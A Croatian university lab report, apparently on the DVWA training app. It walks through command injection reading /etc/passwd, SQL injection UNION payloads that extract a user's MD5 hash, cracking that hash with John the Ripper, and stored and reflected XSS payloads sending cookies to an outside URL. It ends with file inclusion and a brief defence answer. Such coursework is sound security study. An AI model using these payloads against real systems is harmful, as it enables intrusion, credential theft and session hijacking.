@@ -1,0 +1,126 @@
+1) Izvođenje naredbi (Command Injection)
+
+- Sadržaj datoteke /etc/passwd dobiven je pomoću unosa naredbe "1 | cat /etc/passwd" u polje "Enter an IP address:" i klikom na gumb submit.
+- Taj isti napad je moguće izvesti pomoću više različitih naredbi npr. "; cat /etc/passwd".
+- Napad radi na način da stranica uzima vrijednost iz polja te se ta vrijednost nadodaje na kraju naredbne "ping -c 4".
+- Ako na tu naredbu nadodamo npr. "| cat /etc/passwd" sustav će čekati output od naredbe ping, probat će proslijediti taj output naredbi "cat /etc/passwd", ali će ta naredba već ispisati sadržaj u datoteci te će ignorirati output iz naredbe ping.
+
+
+- Ispis datoteke "/etc/passwd" (Slika TASK_1.png)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+
+
+2) Napadi SQL umetanjem (SQL injection)
+
+- U polje "User ID" unosimo SQL naredbe koje se nalaze unutar znakova ' i #
+- Navedene naredbe će se nadovezati na već postojeću naredbu "SELECT first_name, last_name FROM users WHERE user_id = '$id';"
+- Ispis cijele SQL naredbe će vratiti dva stupca te će vrijednost prvog stupca biti prikazana u polju "First name", a vrijednost drugog stupca u polju "Surname"
+
+- SQL naredba za dohvaćanje svih tablica
+' union select table_name from information_schema.tables #
+
+- Ispis imena tablice koja sadrži podatke o korisnicima
+ID: ' union select null, table_name from information_schema.tables #
+First name: 
+Surname: users
+
+- SQL naredba za ispis stupaca u tablici "users"
+' union select null, column_name from information_schema.columns where table_name = 'users' #
+
+- Ispis stupca koji sadrži podatke o lozinkama
+ID: ' union select null, column_name from information_schema.columns where table_name = 'users' #
+First name: 
+Surname: password
+
+- SQL naredba za ispis vrijednosti stupca "password" za korisnika Pablo Picasso
+' union select null, password from users where first_name = 'Pablo' and last_name = 'Picasso' #
+
+- Ispis koji sadrži MD5 hash korisnikove lozinke
+ID: ' union select null, password from users where first_name = 'Pablo' and last_name = 'Picasso' #
+First name: 
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+- Naredba za spremanje MD5 hasha u datoteku
+echo "0d107d09f5bbe40cade3de5c71e9e9b7" > hash.txt
+
+- Naredba za pokretanje alata John the Ripper te ispis u terminalu
+srs@srs-lab-2020:~/srs-lab/Lab3$ sudo john/run/john --format=raw-md5 ../../hash.txt 
+[sudo] password for srs: 
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+Proceeding with single, rules:Single
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:john/run/password.lst
+letmein          (?)     
+1g 0:00:00:00 DONE 2/3 (2022-05-26 19:13) 50.00g/s 9600p/s 9600c/s 9600C/s 123456..knight
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
+
+- Lozinka korisnika Pablo Picasso
+Lozinka: letmein
+
+
+
+3) XSS (Cross Site Scripting)
+
+- Polje za unos ima ograničenje broja znakova u kodu HTML - možete li to zaobići?
+
+Možemo ovo zaobići tako da promijenio vrijednost parametra "maxlength" za taj "textarea" element.
+
+- Opis XSS (Stored) napada
+- Kod XSS Stored napada XSS se pohranjuje na posljužitelju, tipično kao unos forme
+
+1. U polje "Name" stavimo neki tekst
+2. U polje "Message" stavimo ovaj isječak JavaScript koda
+   Kod: <script>console.log(document.cookie);</script>
+3. Za svako sljedeće otvaranje stranice u konzoli vidimo ispis koji sadrži podatke o kolačićima
+   Kolačići: PHPSESSID=j5k46vc7oiq5psvvclm39pii36; security=low
+4. Kako bismo radili GET zahtjeve možemo u polje "Message" staviti ovaj kod. Navedeni kod će tijekom učitavanja stranice preusmjeriti korisnika na URL koji sadrži podatke o kolačićima.
+   Kod: <script>location.href='http://public.tel.fer.hr/srs?cookie=' + document.cookie;</script>
+   Primjer URL-a: http://public.tel.fer.hr/srs?cookie=PHPSESSID=j5k46vc7oiq5psvvclm39pii36;%20security=low
+
+- Opis XSS (Reflected) napada
+- Kod XSS Reflected napada XSS je dio URL-a i dovoljno je samo slanje poveznice kako bi se XSS izveo
+
+1. Ako unesemo neku vrijednost u "What's your name?" polje i kliknemo gumb "submit" vidimo da se u URL-u pojavio novi parametar "name"
+2. Stavimo kao vrijednost "name" parametra isječak JavaScript koda, ali u URL encodingu.
+   Kod: <script>location.href='http://public.tel.fer.hr/srs?cookie=' + document.cookie;</script>
+   URL Encoded kod: %3Cscript%3Elocation.href%3D%27http%3A%2F%2Fpublic.tel.fer.hr%2Fsrs%3Fcookie%3D%27%20%2B%20document.cookie%3B%3C%2Fscript%3E
+   Cijeli URL: http://local_ip/vulnerabilities/xss_r/?name=%3Cscript%3Elocation.href%3D%27http%3A%2F%2Fpublic.tel.fer.hr%2Fsrs%3Fcookie%3D%27%20%2B%20document.cookie%3B%3C%2Fscript%3E#
+	
+
+
+4) Inkluzija datoteka (File inclusion)
+
+- URL pomoću kojeg se ispisuje sadržaj datoteke "/etc/passwd"
+
+http://local_ip/vulnerabilities/fi/?page=/etc/passwd
+
+- Ispis datoteke (slika TASK_4.png)
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+- Kako biste zaštitili navedenu aplikaciju od ovakve vrste napada?
+
+Umjesto imena datoteka koristio bih jedinstvene identifikatore za svaku datoteku, te bih te identifikatore spremao u bazu podataka. Osim toga uveo bi whitelisting te time dopustio otvaranje samo određenih datoteka, tj. samo datoteka koje imaju identifikator spremljen u bazi.
